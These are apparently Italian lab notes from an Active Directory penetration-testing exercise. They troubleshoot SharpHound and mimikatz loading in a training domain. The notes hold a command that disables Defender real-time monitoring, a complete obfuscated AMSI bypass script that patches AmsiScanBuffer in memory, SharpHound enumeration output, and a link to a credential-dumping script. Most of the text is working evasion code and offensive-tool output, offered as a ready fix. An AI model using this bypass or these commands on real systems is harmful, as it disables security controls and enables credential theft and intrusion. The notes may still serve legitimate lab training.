

## Disabilitare Realtime di Defender
```
Set-MpPreference -DisableRealtimeMonitoring $True
```


## Problema con il vecchio SharpHound (BloodHound-4.0.3_old)
```
PS C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors> . .\SharpHound.ps1
PS C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors> Invoke-BloodHound -CollectionMethod All
Exception calling "Load" with "1" argument(s): "Could not load file or assembly '833024 bytes loaded from Anonymously Hosted DynamicMethods Assembly,
Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format."
At C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\SharpHound.ps1:549 char:2
+     $Assembly = [Reflection.Assembly]::Load($UncompressedFileBytes)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : BadImageFormatException

You cannot call a method on a null-valued expression.
At C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\SharpHound.ps1:552 char:2
+     $Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("At ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull

You cannot call a method on a null-valued expression.
At C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors\SharpHound.ps1:553 char:2
+     $Assembly.GetType("SharpHound3.SharpHound").GetMethod("InvokeShar ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
```

Soluzione:

Amsi.ps1:
```
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

```
PS C:\AD\Tools> .\AmsiNET.ps1
True
PS C:\AD\Tools> Invoke-BloodHound -CollectionMethod All
-----------------------------------------------
Initializing SharpHound at 3:07 AM on 5/14/2026
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain DOLLARCORP.MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 85 MB RAM
[+] Creating Schema map for domain MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
[+] Creating Schema map for domain MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
[+] Creating Schema map for domain MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
[+] Creating Schema map for domain MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
[+] Creating Schema map for domain MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
[+] Creating Schema map for domain MONEYCORP.LOCAL using path CN=Schema,CN=Configuration,DC=moneycorp,DC=local
Status: 179 objects finished (+179 44.75)/s -- Using 117 MB RAM
Enumeration finished in 00:00:04.7299093
Compressing data to C:\AD\Tools\20260514030745_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 3:07 AM on 5/14/2026! Happy Graphing!
```

## Import di mimikatz con il "."
```
[DCORP-ADMINSRV]: PS C:\Program Files> . .\Invoke-Mimi.ps1
C:\Program Files\Invoke-Mimi.ps1 : Cannot dot-source this command because it was defined in a different language mode. To invoke this command without importing
its contents, omit the '.' operator.
At line:1 char:1
+ . .\Invoke-Mimi.ps1
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Invoke-Mimi.ps1], NotSupportedException
    + FullyQualifiedErrorId : DotSourceNotSupported,Invoke-Mimi.ps1
```

Usare per esempio Invoke-TheKat: https://github.com/XK3NF4/ADTools/blob/main/Invoke-TheKatEx-keys-stdx.ps1

